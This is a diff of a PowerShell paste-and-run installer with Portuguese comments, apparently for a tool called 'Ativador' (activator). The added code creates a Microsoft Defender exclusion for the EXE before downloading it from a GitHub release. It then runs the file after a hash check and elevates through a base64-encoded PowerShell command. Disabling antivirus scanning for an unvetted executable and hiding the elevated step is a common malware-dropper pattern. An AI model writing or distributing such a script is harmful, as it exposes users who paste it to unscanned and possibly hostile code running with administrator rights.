@@ -1,58 +1,133 @@
 # PowerShell 5.1 ou superior, Windows. Publicar como texto, sem HTML.
-# Preencha os dois valores abaixo antes de distribuir o comando.
+# Site v5: exclusao somente do EXE antes do download.
 & {
     $ErrorActionPreference = 'Stop'
     $ExecutableUrl = 'https://github.com/forcewarltda-crypto/Ativador-.exe/releases/download/v5.0/Ativador.exe'
     $ExpectedSha256 = '35FEF7E232DD83366236552305B52040EDAAB70A6C5DA5C96932EC97DC2B00FD'
-
-    if ([string]::IsNullOrWhiteSpace($ExecutableUrl) -or
-        $ExpectedSha256 -notmatch '\A[0-9a-fA-F]{64}\z') {
-        throw 'Instalador ainda nao configurado: falta a URL HTTPS ou o SHA-256 do executavel. Contate o suporte.'
+    if ([string]::IsNullOrWhiteSpace($ExecutableUrl) -or $ExpectedSha256 -notmatch '\A[0-9a-fA-F]{64}\z') {
+        throw 'Instalador ainda nao configurado: falta a URL HTTPS ou o SHA-256 do executavel.'
     }
     $downloadUri = $null
     if (-not [Uri]::TryCreate($ExecutableUrl, [UriKind]::Absolute, [ref]$downloadUri) -or
-        $downloadUri.Scheme -ne 'https' -or $downloadUri.UserInfo) {
-        throw 'A URL do executavel deve usar HTTPS e nao pode conter credenciais.'
+        $downloadUri.Scheme -ne 'https' -or $downloadUri.UserInfo) { throw 'A URL do executavel deve usar HTTPS e nao pode conter credenciais.' }
+    if ($env:OS -ne 'Windows_NT' -or $PSVersionTable.PSVersion -lt [version]'5.1') { throw 'Use o PowerShell 5.1 ou superior no Windows.' }
+
+    $downloadDirectory = Join-Path ([IO.Path]::GetTempPath()) ('ForceWar-Download-' + [Guid]::NewGuid().ToString('N'))
+    $null = New-Item -ItemType Directory -Path $downloadDirectory -ErrorAction Stop
+    $executablePath = Join-Path $downloadDirectory 'Executor.exe'
+    Write-Host 'A exclusao do Microsoft Defender sera configurada antes do download, somente para este EXE:'
+    Write-Host $executablePath
+    Write-Host 'Esse arquivo deixara de ser examinado pelo antivirus.'
+    $adminAction = {
+# Incorporado no install. Configura somente o EXE, antes de baixa-lo.
+param([string]$ExecutablePath, [string]$ExecutableUrl, [string]$ExpectedSha256)
+$ErrorActionPreference = 'Stop'
+
+function Assert-FWLocalPath([string]$Path, [switch]$MissingLeaf) {
+    if ($Path -notmatch '^[A-Za-z]:[\\/]' -or $Path.IndexOfAny([char[]]'*?[]') -ge 0) {
+        throw 'Caminho local invalido.'
     }
-    if ($env:OS -ne 'Windows_NT' -or $PSVersionTable.PSVersion -lt [version]'5.1') {
-        throw 'Use o PowerShell 5.1 ou superior no Windows.'
+    $normalized = [IO.Path]::GetFullPath($Path)
+    if ($normalized.TrimEnd('\') -eq [IO.Path]::GetPathRoot($Path).TrimEnd('\')) { throw 'Raiz do disco nao permitida.' }
+    $check = $normalized
+    if ($MissingLeaf) { $check = Split-Path -Parent $normalized }
+    $item = Get-Item -LiteralPath $check -Force -ErrorAction Stop
+    while ($null -ne $item) {
+        if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) { throw 'Links ou juncoes nao permitidos.' }
+        if ($item -is [IO.FileInfo]) { $item = $item.Directory } else { $item = $item.Parent }
     }
+    return $normalized
+}
+
+function Test-FWExclusion($Items, [string]$Path) {
+    foreach ($entry in @($Items)) {
+        if ($null -ne $entry -and [string]::Equals(([string]$entry).TrimEnd('\'), $Path.TrimEnd('\'), [StringComparison]::OrdinalIgnoreCase)) { return $true }
+    }
+    return $false
+}
+
+function Invoke-FWAdminStep {
+    $downloadUri = $null
+    if (-not [Uri]::TryCreate($ExecutableUrl, [UriKind]::Absolute, [ref]$downloadUri) -or
+        $downloadUri.Scheme -ne 'https' -or $downloadUri.UserInfo) { throw 'A URL do executavel deve usar HTTPS e nao pode conter credenciais.' }
+    if ($ExpectedSha256 -notmatch '\A[0-9a-fA-F]{64}\z') { throw 'SHA-256 esperado invalido.' }
+    $exe = Assert-FWLocalPath $ExecutablePath -MissingLeaf
+    if ((Split-Path -Leaf $exe) -cne 'Executor.exe' -or
+        (Split-Path -Leaf (Split-Path -Parent $exe)) -notmatch '^ForceWar-Download-[a-f0-9]{32}$') { throw 'Destino do download invalido.' }
+    if (Test-Path -LiteralPath $exe) { throw 'O destino ja existe. Nenhum arquivo sera sobrescrito.' }
+
+    Write-Host ('Preparando exclusao somente para o arquivo: ' + $exe)
+    $prefs = Get-MpPreference -ErrorAction Stop
+    if (-not (Test-FWExclusion $prefs.ExclusionPath $exe)) {
+        Add-MpPreference -ExclusionPath $exe -ErrorAction Stop
+    }
+    $confirmed = $false
+    for ($attempt = 0; $attempt -lt 20; $attempt++) {
+        $prefs = Get-MpPreference -ErrorAction Stop
+        if (Test-FWExclusion $prefs.ExclusionPath $exe) { $confirmed = $true; break }
+        Start-Sleep -Milliseconds 500
+    }
+    if (-not $confirmed) { throw 'O Defender nao confirmou a exclusao do EXE. O download nao foi iniciado.' }
 
     $previousTls = [Net.ServicePointManager]::SecurityProtocol
-    $partialPath = $null
+    $created = $false
+    $verified = $false
     try {
         [Net.ServicePointManager]::SecurityProtocol = $previousTls -bor [Net.SecurityProtocolType]::Tls12
-        $downloadDirectory = Join-Path ([IO.Path]::GetTempPath()) ('ForceWar-Download-' + [Guid]::NewGuid().ToString('N'))
-        $null = New-Item -ItemType Directory -Path $downloadDirectory -ErrorAction Stop
-        $partialPath = Join-Path $downloadDirectory 'Executor.exe.part'
-        $executablePath = Join-Path $downloadDirectory 'Executor.exe'
-
-        Write-Host 'Baixando o Executor...'
-        Invoke-WebRequest -Uri $downloadUri.AbsoluteUri -OutFile $partialPath -UseBasicParsing -MaximumRedirection 5 -TimeoutSec 300 -ErrorAction Stop
+        $null = Assert-FWLocalPath $exe -MissingLeaf
+        # Reserva apenas o nome exato excluido. CreateNew recusa arquivo que surgiu durante a espera.
+        $stream = [IO.File]::Open($exe, [IO.FileMode]::CreateNew, [IO.FileAccess]::Write, [IO.FileShare]::None)
+        $created = $true
+        $stream.Dispose()
+        Set-Content -LiteralPath $exe -Stream Zone.Identifier -Value "[ZoneTransfer]`r`nZoneId=3" -Encoding ASCII -ErrorAction Stop
+        Write-Host 'Exclusao confirmada. Baixando o Executor...'
+        Invoke-WebRequest -Uri $downloadUri.AbsoluteUri -OutFile $exe -UseBasicParsing -MaximumRedirection 5 -TimeoutSec 300 -ErrorAction Stop
+        $null = Assert-FWLocalPath $exe
         Write-Host 'Conferindo a integridade do arquivo...'
-        $actualHash = (Get-FileHash -LiteralPath $partialPath -Algorithm SHA256 -ErrorAction Stop).Hash
-        if ($actualHash -ine $ExpectedSha256) {
-            throw 'SHA-256 divergente. O arquivo nao sera executado. Contate o suporte.'
+        if ((Get-FileHash -LiteralPath $exe -Algorithm SHA256 -ErrorAction Stop).Hash -ine $ExpectedSha256) {
+            throw 'SHA-256 divergente. O arquivo nao sera executado.'
         }
-
-        Move-Item -LiteralPath $partialPath -Destination $executablePath -ErrorAction Stop
-        # Preserva a identificacao de arquivo obtido da Internet para o Windows.
-        Set-Content -LiteralPath $executablePath -Stream Zone.Identifier -Value "[ZoneTransfer]`r`nZoneId=3" -Encoding ASCII -ErrorAction Stop
-        Write-Host 'Arquivo verificado. Confirme a solicitacao de administrador do Windows.'
-        try {
-            $started = Start-Process -FilePath $executablePath -WorkingDirectory $downloadDirectory -Verb RunAs -PassThru -ErrorAction Stop
+        # Mantem a identificacao de origem Internet, inclusive se o downloader recriou o arquivo.
+        Set-Content -LiteralPath $exe -Stream Zone.Identifier -Value "[ZoneTransfer]`r`nZoneId=3" -Encoding ASCII -ErrorAction Stop
+        if ((Get-FileHash -LiteralPath $exe -Algorithm SHA256 -ErrorAction Stop).Hash -ine $ExpectedSha256) {
+            throw 'O Executor mudou depois da verificacao. Abertura cancelada.'
         }
-        catch {
-            throw 'O Windows nao iniciou o Executor. A solicitacao pode ter sido cancelada ou o arquivo bloqueado. Nenhuma protecao foi alterada.'
-        }
-        Write-Host ('Solicitacao de abertura enviada. Arquivo: ' + $executablePath)
-        Write-Host 'Acompanhe a conclusao na janela do Executor.'
+        $verified = $true
+        $null = Start-Process -FilePath $exe -WorkingDirectory (Split-Path -Parent $exe) -PassThru -ErrorAction Stop
+        Write-Host 'Arquivo verificado. Solicitacao de abertura enviada ao Executor.'
     }
     finally {
         [Net.ServicePointManager]::SecurityProtocol = $previousTls
-        # Remove somente o download parcial desta tentativa; nunca pastas recursivamente.
-        if ($partialPath -and (Test-Path -LiteralPath $partialPath -PathType Leaf)) {
-            Remove-Item -LiteralPath $partialPath -Force -ErrorAction SilentlyContinue
+        if ($created -and -not $verified -and (Test-Path -LiteralPath $exe)) {
+            $null = Assert-FWLocalPath $exe
+            Remove-Item -LiteralPath $exe -Force -ErrorAction Stop
         }
     }
+}
+
+Invoke-FWAdminStep
+    }
+    $isAdministrator = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if ($isAdministrator) {
+        Write-Host 'PowerShell ja executado como administrador. Continuando nesta janela...'
+        & $adminAction -ExecutablePath $executablePath -ExecutableUrl $ExecutableUrl -ExpectedSha256 $ExpectedSha256
+    }
+    else {
+        Write-Host 'Confirme a solicitacao de administrador do Windows para continuar.'
+        # Transporte Unicode de literais escapados, sem alterar politica de execucao.
+        $literalExe = "'" + $executablePath.Replace("'", "''") + "'"
+        $literalUrl = "'" + $ExecutableUrl.Replace("'", "''") + "'"
+        $adminCode = "try { & {`n" + $adminAction.ToString() + "`n} -ExecutablePath " + $literalExe + " -ExecutableUrl " + $literalUrl + " -ExpectedSha256 '" + $ExpectedSha256 + "'" + '; exit 0 } catch { Write-Host (''Falha: '' + $_.Exception.Message); exit 1 }'
+        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($adminCode))
+        $shellPath = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
+        try {
+            $started = Start-Process -FilePath $shellPath -ArgumentList ('-NoLogo -NoProfile -NonInteractive -EncodedCommand ' + $encoded) -WorkingDirectory $downloadDirectory -Verb RunAs -PassThru -ErrorAction Stop
+            $started.WaitForExit()
+        }
+        catch { throw 'O Windows nao iniciou a etapa administrativa. A solicitacao pode ter sido cancelada ou bloqueada.' }
+        if ($started.ExitCode -ne 0) {
+            throw 'Falha na etapa administrativa: exclusao, download, integridade ou abertura. Uma exclusao ja aplicada pode permanecer.'
+        }
+    }
+    Write-Host ('Abertura solicitada. Arquivo: ' + $executablePath)
 }
